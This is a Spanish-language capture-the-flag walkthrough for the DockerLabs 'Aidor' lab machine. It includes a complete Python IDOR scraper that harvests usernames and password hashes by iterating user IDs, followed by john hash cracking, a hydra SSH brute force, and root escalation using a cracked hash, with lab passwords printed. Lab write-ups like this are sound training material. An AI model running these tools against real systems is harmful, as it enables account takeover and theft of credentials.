### Aidor-Dockerlabs🇪🇸

#### 1. Primero ponemos en marcha el laboratorio.
```bash
 unzip aidor.zip
sudo bash ./auto_deploy.sh aidor.tar 
```

<img width="958" height="562" alt="image" src="https://github.com/user-attachments/assets/1a7192a5-9485-4c3e-9e64-bc1268dd655e" />


#### 1.2 Realizaremos un ping para la comprobación de conexión.
```bash
ping -c3 172.17.0.2
```

<img width="954" height="230" alt="image" src="https://github.com/user-attachments/assets/623137d9-372c-4cc6-a23e-6dd4626baed0" />


#### 2. Ahora vamos a escanear todos los puertos mediante nmap.
```bash
nmap -p- -sCV 172.17.0.2
```

<img width="963" height="317" alt="image" src="https://github.com/user-attachments/assets/dfdbd47e-7835-484f-a87a-131b502d94d7" />


#### 3. Iremos al http en el puerto 5000 y podemos ver un formulario.

<img width="934" height="853" alt="image" src="https://github.com/user-attachments/assets/898e549a-2046-4da8-a31e-cc07195dc4ef" />


#### 4. No funcionan las inyecciones asi que usaremos ffuf para encontrar los directorios ocultos.
```bash
ffuf -u http://172.17.0.2:5000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php -t 50```
```

<img width="996" height="300" alt="image" src="https://github.com/user-attachments/assets/89f98632-5e11-48f6-a137-44884708dc94" />


#### 4. Ahora creamos una cuenta cualquiera desde `/register` y entramos.

<img width="924" height="995" alt="image" src="https://github.com/user-attachments/assets/06ad5652-e69a-48d4-bcf1-0e8667b669ed" />


#### 5. Vamos a extraer la información mediante IDOR.

```python
import requests
from bs4 import BeautifulSoup
import re
import time

def extract_user_info_from_html(html_content):
    """
    Extrae el nombre de usuario y el hash de contraseña del HTML
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Extraer nombre de usuario
    username = None
    welcome_header = soup.find('h2', string=re.compile('Bienvenido,'))
    if welcome_header:
        username_text = welcome_header.get_text()
        username = username_text.replace('Bienvenido,', '').strip()
    
    # Extraer hash de contraseña
    password_hash = None
    password_hash_div = soup.find('div', class_='password-hash')
    if password_hash_div:
        password_hash = password_hash_div.get_text(strip=True)
    
    return username, password_hash

def fetch_user_data(base_url, user_id):
    """
    Obtiene los datos del usuario para un ID específico
    """
    try:
        url = f"{base_url}?id={user_id}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            username, password_hash = extract_user_info_from_html(response.text)
            
            if username and password_hash:
                print(f"[+] ID {user_id}: Encontrado - {username}:{password_hash}")
                return username, password_hash
            else:
                print(f"[-] ID {user_id}: No se pudieron extraer todos los datos")
                return None, None
        else:
            print(f"[-] ID {user_id}: Error HTTP {response.status_code}")
            return None, None
            
    except requests.RequestException as e:
        print(f"[-] ID {user_id}: Error de conexión - {e}")
        return None, None

def main():
    base_url = "http://172.17.0.2:5000/dashboard"
    output_file = "users_hashes.txt"
    
    print("Iniciando extracción de usuarios y hashes...")
    print("=" * 50)
    
    users_found = 0
    
    with open(output_file, 'w') as f:
        for user_id in range(0, 55):  # Del 0 al 54
            username, password_hash = fetch_user_data(base_url, user_id)
            
            if username and password_hash:
                f.write(f"{username}:{password_hash}\n")
                users_found += 1
            
            # Pequeña pausa para no sobrecargar el servidor
            time.sleep(0.1)
    
    print("=" * 50)
    print(f"Extracción completada. Se encontraron {users_found} usuarios.")
    print(f"Los datos se guardaron en: {output_file}")
    
    # Mostrar preview del archivo
    print("\nPreview del archivo:")
    print("-" * 30)
    try:
        with open(output_file, 'r') as f:
            lines = f.readlines()
            for line in lines[:5]:  # Mostrar primeros 5 registros
                print(line.strip())
        if len(lines) > 5:
            print("...")
    except FileNotFoundError:
        print("No se pudo leer el archivo de salida")

if __name__ == "__main__":
    main()
```

#### 6. Después de crear el programa vamos a ponerlo en marcha mediante :
```bash
python3 -m venv .venv
source .venv/bin/activate.fish
pip3 install requests beautifulsoup4
python3 findUsers.py
```

<img width="958" height="1039" alt="image" src="https://github.com/user-attachments/assets/373c7024-b677-4e74-a4a7-0a21039e83c2" />


#### 7. Vamos a crackear la password mediante john
```bash
john --format=Raw-SHA256 --wordlist=<WORDLIST> users_hashes.txt
```


#### 8. Como nos han dado las posibles soluciones del ssh haremos un txt con user y otro con las posibles password.

**Users.txt**

```
juan.perez
aidor
pingu
pepe
```

**password.txt**

```
password
chocolate
pingu
pepe
```



#### 9. Haremos el hydra para crackear el user y password.
```bash
hydra -L users.txt -P password.txt ssh://172.17.0.2 -t 64 -I
```

<img width="966" height="237" alt="image" src="https://github.com/user-attachments/assets/efa261e0-a11a-414e-a65c-4400b36cf91b" />


#### 10. Entraremos mediante ssh.
```bash
ssh aidor@172.17.0.2
# passwd: chocolate
```

<img width="958" height="229" alt="image" src="https://github.com/user-attachments/assets/63a0b7dd-b862-4390-93b6-218f9e9408d8" />


#### 11. Vamos a ver que binarios puede modificar.
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
 which strings
ls -la /home
```

#### 11.1 EL unico útil es el ultimo `ls -la /home` porque es el unico lugar en donde tenemos algo de privilegios.



#### 11.2 Ahora miearemos el contenido de app.py y encontramos la clave de root en hash. 
```bash
cat /home/app.py
```

<img width="957" height="1042" alt="image" src="https://github.com/user-attachments/assets/a33ff6ff-703c-4fd6-a000-5a5ff9963c9d" />

#### 11.3 Iremos a https://crackstation.net/ y desencriptamos la hash.

<img width="963" height="647" alt="image" src="https://github.com/user-attachments/assets/14d02f77-aed4-4d93-bdb0-20fcd15ce91c" />


#### 12 Escalamos a root sabiendo que tenemos la password.
```bash
su
# passwd: estrella
```

<img width="973" height="169" alt="image" src="https://github.com/user-attachments/assets/a52c2a3c-2fb7-433b-b0fd-2f3bd9f994b9" />






